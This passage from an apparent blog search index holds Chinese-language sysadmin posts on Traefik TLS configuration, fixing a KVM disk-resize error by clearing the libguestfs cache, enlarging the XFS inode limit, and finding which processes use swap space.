class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elevel\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eDEBUG\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eapi\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003einsecure\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003edashboard\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eentryPoints\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eaddress\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:80\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#http:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#  redirections:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#    entryPoint:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#      to: https\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"c\"\u003e#      scheme: https\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttps\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eaddress\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:443\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eproviders\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003edirectory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/export/servers/traefik/dynamic\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ewatch\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e所有的配置都放到到/export/servers/traefik/dynamic目录下了，动态更新：\u003c/p\u003e\n\u003cp\u003ecerts.yml来定义证书选项\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003etls\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ecertificates\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ecertFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/export/servers/traefik/ddky.crt\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ekeyFile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/export/servers/traefik/ddky.key\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003edefault\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003esniStrict\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eminVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eVersionTLS12\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ecipherSuites\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003eTLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003etest7-01.yml单独test7.ddky.com的配置\u003c/p\u003e","title":"traefik配置digicert家得泛域名证书"},{"content":"在172.18.30.1和172.16.60.10上\n使用vm.sh创建虚机时，会报错\n- Resizing the disk to 80G ... ERR: Could not resize disk. 去 /export/kvm/虚机目录下查看log\nCould not open \u0026#39;/var/tmp/.guestfs-101448/appliance.d/root\u0026#39;: No such file or directory 解决方法很简单，清除掉Cache即可：\nrm -rf /var/tmp/.guestfs-0/ 附上CentOS7安装 kvm 的命令：\nyum install qemu-kvm libvirt libvirt-python libguestfs-tools virt-install ","permalink":"https://rendoumi.com/posts/20231221-vm_error/","summary":"\u003cp\u003e在172.18.30.1和172.16.60.10上\u003c/p\u003e\n\u003cp\u003e使用vm.sh创建虚机时，会报错\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231221-vm_error/2022-04-22_140600.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Resizing the disk to 80G ... ERR: Could not resize disk.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e去 /export/kvm/虚机目录下查看log\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCould not open \u003cspan class=\"s1\"\u003e\u0026#39;/var/tmp/.guestfs-101448/appliance.d/root\u0026#39;\u003c/span\u003e: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解决方法很简单，清除掉Cache即可：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erm -rf /var/tmp/.guestfs-0/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e附上CentOS7安装 kvm 的命令：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install qemu-kvm libvirt libvirt-python libguestfs-tools virt-install\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"vm.sh创建虚机失败"},{"content":"终于遇到了inode不够了，细碎文件爆棚了，导致inode不够了。\nXFS 文件系统本质上是没有 inode 的限制的\n只有一个缺省的限制，使用现有文件系统的 25% 来存储 inode 信息。\n这个缺省的配置在大多数情况下都是够用的。\n某些情况下不够用，可以删除一些文件来缓解。\n终极办法是增大这个 25% 的阈值来解决：\nroot@zombie:~# xfs_info /srv/backup/ metadane=/dev/mapper/slow-backup isize=256 agcount=17, agsize=2621440 blks = sectsz=512 attr=2 data = bsize=4096 blocks=44564480, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 log =internal bsize=4096 blocks=20480, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime=brak extsz=4096 blocks=0, rtextents=0 上面，我们看到 imaxpct=25 ，就是这个配置了。\n增大的方法：\nxfs_growfs -m 30 这样就增大到 30% 了\n","permalink":"https://rendoumi.com/posts/20231221-inode_xfs/","summary":"\u003cp\u003e终于遇到了inode不够了，细碎文件爆棚了，导致inode不够了。\u003c/p\u003e\n\u003cp\u003eXFS 文件系统本质上是没有 inode 的限制的\u003c/p\u003e\n\u003cp\u003e只有一个缺省的限制，使用现有文件系统的 25% 来存储 inode 信息。\u003c/p\u003e\n\u003cp\u003e这个缺省的配置在大多数情况下都是够用的。\u003c/p\u003e\n\u003cp\u003e某些情况下不够用，可以删除一些文件来缓解。\u003c/p\u003e\n\u003cp\u003e终极办法是增大这个 25% 的阈值来解决：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eroot@zombie:~# xfs_info /srv/backup/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emetadane\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/mapper/slow-backup \u003cspan class=\"nv\"\u003eisize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e256\u003c/span\u003e    \u003cspan class=\"nv\"\u003eagcount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e17, \u003cspan class=\"nv\"\u003eagsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2621440\u003c/span\u003e \u003cspan class=\"nv\"\u003eblks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003esectsz\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e512\u003c/span\u003e   \u003cspan class=\"nv\"\u003eattr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edata\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003ebsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e   \u003cspan class=\"nv\"\u003eblocks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e44564480, \u003cspan class=\"nv\"\u003eimaxpct\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e25\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003esunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e      \u003cspan class=\"nv\"\u003eswidth\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e blks\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003enaming\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003eversion \u003cspan class=\"m\"\u003e2\u003c/span\u003e              \u003cspan class=\"nv\"\u003ebsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ascii-ci\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elog\u003c/span\u003e     \u003cspan class=\"o\"\u003e=\u003c/span\u003einternal               \u003cspan class=\"nv\"\u003ebsize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e   \u003cspan class=\"nv\"\u003eblocks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e20480, \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e=\u003c/span\u003e                       \u003cspan class=\"nv\"\u003esectsz\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e512\u003c/span\u003e   \u003cspan class=\"nv\"\u003esunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e blks, lazy-count\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erealtime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrak                   \u003cspan class=\"nv\"\u003eextsz\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e   \u003cspan class=\"nv\"\u003eblocks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0, \u003cspan class=\"nv\"\u003ertextents\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面，我们看到 imaxpct=25 ，就是这个配置了。\u003c/p\u003e\n\u003cp\u003e增大的方法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exfs_growfs -m \u003cspan class=\"m\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就增大到 30% 了\u003c/p\u003e","title":"Xfs文件系统下增加inode"},{"content":"在机器上执行命令free -g 和 free -k\n看看有多少空闲\n8G的Swap交换空间都被用光了！！！\n再用kb的单位看看，一共8388604，基本用光掉了\n查看是哪些进程使用了交换空间：\nfind /proc -maxdepth 2 -path \u0026#34;/proc/[0-9]*/status\u0026#34; -readable -exec awk -v FS=\u0026#34;:\u0026#34; \u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) printf \u0026#34;%10s %-30s %20s\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;]}\u0026#39; \u0026#39;{}\u0026#39; \\; | awk \u0026#39;{print $(NF-1),$0}\u0026#39; | sort -h | cut -d \u0026#34; \u0026#34; -f2- 6504的qemu-kvm用掉了4.8G，看起来不太直观。\nfind /proc -maxdepth 2 -path \u0026#34;/proc/[0-9]*/status\u0026#34; -readable -exec awk -v FS=\u0026#34;:\u0026#34; -v TOTSWP=\u0026#34;$(cat /proc/swaps | sed 1d | awk \u0026#39;BEGIN{sum=0} {sum=sum+$(NF-2)} END{print sum}\u0026#39;)\u0026#34; \u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) {used_swap=process[\u0026#34;VmSwap\u0026#34;];sub(/[ a-zA-Z]+/,\u0026#34;\u0026#34;,used_swap);percent=(used_swap/TOTSWP*100); printf \u0026#34;%10s %-30s %20s %6.2f%\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;],percent} }\u0026#39; \u0026#39;{}\u0026#39; \\; | awk \u0026#39;{print $(NF-2),$0}\u0026#39; | sort -hr | head | cut -d \u0026#34; \u0026#34; -f2- 一目了然，6504是台Win7的虚机，祸害啊。\n","permalink":"https://rendoumi.com/posts/20231215-swap_usage/","summary":"\u003cp\u003e在机器上执行命令free -g 和 free -k\u003c/p\u003e\n\u003cp\u003e看看有多少空闲\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_175935.png\"\u003e\u003c/p\u003e\n\u003cp\u003e8G的Swap交换空间都被用光了！！！\u003c/p\u003e\n\u003cp\u003e再用kb的单位看看，一共8388604，基本用光掉了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_180008.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看是哪些进程使用了交换空间：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /proc -maxdepth \u003cspan class=\"m\"\u003e2\u003c/span\u003e -path \u003cspan class=\"s2\"\u003e\u0026#34;/proc/[0-9]*/status\u0026#34;\u003c/span\u003e -readable -exec awk -v \u003cspan class=\"nv\"\u003eFS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:\u0026#34;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) printf \u0026#34;%10s %-30s %20s\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;]}\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{}\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $(NF-1),$0}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -h \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -f2-\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_180122.png\"\u003e\u003c/p\u003e\n\u003cp\u003e6504的qemu-kvm用掉了4.8G，看起来不太直观。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind /proc -maxdepth \u003cspan class=\"m\"\u003e2\u003c/span\u003e -path \u003cspan class=\"s2\"\u003e\u0026#34;/proc/[0-9]*/status\u0026#34;\u003c/span\u003e -readable -exec awk -v \u003cspan class=\"nv\"\u003eFS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;:\u0026#34;\u003c/span\u003e -v \u003cspan class=\"nv\"\u003eTOTSWP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat /proc/swaps \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed 1d \u003cspan class=\"p\"\u003e|\u003c/span\u003e 